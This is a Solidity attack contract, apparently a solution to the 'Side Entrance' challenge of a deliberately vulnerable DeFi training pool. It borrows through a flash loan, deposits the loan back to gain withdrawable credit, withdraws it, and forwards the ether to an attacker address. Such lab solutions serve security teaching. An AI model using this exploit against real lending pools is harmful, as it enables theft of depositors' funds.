// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntraceAttack is IFlashLoanEtherReceiver{
    SideEntranceLenderPool lenderPoolAddr;
    address attacker;

    constructor(address _pool, address _attacker){
        lenderPoolAddr = SideEntranceLenderPool(_pool);
        attacker = _attacker;
    }

    function attack(uint256 amount) external {
        lenderPoolAddr.flashLoan(amount);
    }

    function execute() external payable{
        lenderPoolAddr.deposit{value: msg.value}();
    }

    function withdrawAll() external{
        lenderPoolAddr.withdraw();
    }

    receive() external payable {
        (bool sent, ) = attacker.call{value: address(this).balance}("");
        require(sent, "failed");
    }
}